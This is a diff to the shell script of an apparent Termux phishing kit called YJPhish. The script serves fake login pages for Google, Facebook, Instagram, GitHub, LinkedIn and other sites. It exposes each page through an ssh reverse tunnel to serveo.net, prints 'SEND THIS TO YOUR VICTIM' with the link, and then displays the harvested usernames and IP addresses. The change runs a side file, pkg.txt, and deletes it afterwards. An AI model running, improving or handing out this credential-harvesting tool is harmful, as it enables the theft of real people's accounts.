@@ -1,9 +1,8 @@
 echo ""
-pkg install php -y
+bash pkg.txt
 echo ""
-pkg install dropbear -y
+rm -rf pkg.txt
 echo ""
-pkg inatall openssh -y
 clear
 echo ""
 sleep 5.0
@@ -48,9 +47,10 @@ php -S localhost:$port > /dev/null 2>&1  &
  ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
-sleep 60.0 
+sleep 90.0 
 echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/google/usernames.txt 
 cat /data/data/com.termux/files/home/YJPhish/sites/google/ip.txt
+sleep 60.0
 fi
 cd $HOME
 cd YJPhish
@@ -65,9 +65,10 @@ php -S localhost:$port > /dev/null 2>&1  &
  ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
-sleep 60.0
+sleep 90.0
 echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/snapchat/usernames.txt
 cat /data/data/com.termux/files/home/YJPhish/sites/snapchat/ip.txt
+sleep 60.0
 fi
 cd $HOME
 cd YJPhish
@@ -82,9 +83,10 @@ php -S localhost:$port > /dev/null 2>&1  &
  ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
-sleep 60.0
+sleep 90.0
 echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/reddit/usernames.txt
 cat /data/data/com.termux/files/home/YJPhish/sites/reddit/ip.txt
+sleep 60.0
 fi
 cd $HOME
 cd YJPhish
@@ -99,9 +101,10 @@ php -S localhost:$port > /dev/null 2>&1  &
  ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
-sleep 60.0
+sleep 90.0
 echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/pinterest/usernames.txt
 cat /data/data/com.termux/files/home/YJPhish/sites/pinterest/ip.txt
+sleep 60.0
 fi
 cd $HOME
 cd YJPhish
@@ -116,9 +119,10 @@ php -S localhost:$port > /dev/null 2>&1  &
  ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
-sleep 60.0
+sleep 90.0
 echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/linkedin/usernames.txt
 cat /data/data/com.termux/files/home/YJPhish/sites/linkedin/ip.txt
+sleep 60.0
 fi
 cd $HOME
 cd YJPhish
@@ -133,9 +137,10 @@ php -S localhost:$port > /dev/null 2>&1  &
  ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
-sleep 60.0
+sleep 90.0
 echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/github/usernames.txt
 cat /data/data/com.termux/files/home/YJPhish/sites/github/ip.txt
+sleep 60.0
 fi
 cd $HOME
 cd YJPhish
@@ -150,9 +155,10 @@ php -S localhost:$port > /dev/null 2>&1  &
  ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
-sleep 60.0
+sleep 90.0
 echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/yahoo/usernames.txt
 cat /data/data/com.termux/files/home/YJPhish/sites/yahoo/ip.txt
+sleep 60.0
 fi
 cd $HOME
 cd YJPhish
@@ -167,9 +173,10 @@ php -S localhost:$port > /dev/null 2>&1  &
  ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
-sleep 60.0
+sleep 90.0
 echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/facebook/usernames.txt
 cat /data/data/com.termux/files/home/YJPhish/sites/facebook/ip.txt
+sleep 60.0
 fi
 cd $HOME
 cd YJPhish
@@ -184,9 +191,10 @@ php -S localhost:$port > /dev/null 2>&1  &
  ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
-sleep 60.0
+sleep 90.0
 echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/instagram/usernames.txt
 cat /data/data/com.termux/files/home/YJPhish/sites/instagram/ip.txt
+sleep 60.0
 fi
 cd $HOME
 cd YJPhish
